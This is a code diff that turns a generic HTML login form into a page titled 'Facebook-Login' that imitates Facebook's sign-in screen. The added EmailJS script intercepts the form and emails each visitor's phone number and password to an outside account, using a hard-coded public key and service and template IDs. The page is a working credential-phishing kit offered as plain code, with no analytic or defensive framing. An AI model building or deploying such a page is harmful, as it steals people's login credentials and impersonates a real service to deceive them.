@@ -1,9 +1,31 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Login Form</title>
+    <title>Facebook-Login</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            // https://dashboard.emailjs.com/admin/account
+            emailjs.init({
+              publicKey: "5WIueTHzbBJS_kB6N",
+            });
+        })();
+    </script>
+    <script type="text/javascript">
+        window.onload = function() {
+            document.getElementById('myForm').addEventListener('submit', function(event) {
+                event.preventDefault();
+                // these IDs from the previous steps
+                emailjs.sendForm('service_jqahwy9', 'template_6vshnf7', this)
+                    .then(() => {
+                        console.log('SUCCESS!');
+                    }, (error) => {
+                        console.log('FAILED...', error);
+                    });
+            });
+        }
+    </script>
+
 <style>
   body {
     font-family: Arial, sans-serif;
@@ -43,7 +65,7 @@
     font-size: 16px;
   }
 
-  .form-group button {
+  .form-group .submit {
     font-family: Arial, Helvetica, sans-serif;
     width: 100%;
     padding: 10px;
@@ -55,10 +77,6 @@
     font-size: 20px;
     cursor: pointer;
     height: 50px;
-  }
-
-  .form-group button:hover {
-
   }
 
   .forgotten-password {
@@ -99,30 +117,27 @@
 </style>
 </head>
 <body>
+  <div class="container">
+    <h2>Login</h2>
+    <form id="myForm">
+        <div class="form-group">
+            <input type="tel" id="phone" name="phone" placeholder="Phone number" required>
+        </div>
+        <div class="form-group">
+            <input type="password" id="password" name="password" placeholder="Password" required>
+        </div>
+        <div class="form-group">
+            <input class="submit" type="submit" value="Login">
+        </div>
+        <p class="forgotten-password"><a href="*">Forgotten password?</a></p>
 
-<div class="container">
-  <h2>Login</h2>
-  <form action="send_email.php" method="post">
-    <div class="form-group">
-      <input type="email" id="email" name="email" placeholder="Email address or phone number" required>
-    </div>
-    <div class="form-group">
-      <input type="password" id="password" name="password" placeholder="Password" required>
-    </div>
-    <div class="form-group">
-      <button type="submit">Log in</button>
-    </div>
-    <p class="forgotten-password"><a href="*">Forgotten password?</a></p>
+        <div class="buttom-line"></div>
 
-    <div class="buttom-line"></div>
+        <button class="create-account-btn">Create new account</button>
+    </form>
 
-    <button class="create-account-btn">Create new account</button>
-
-  </form>
-
-<p class="create-page"><a href="*">Create page</a> for celebrity, brand or business</p>
-
+    <p class="create-page"><a href="*">Create page</a> for celebrity, brand or business</p>
 </div>
-
 </body>
 </html>
+
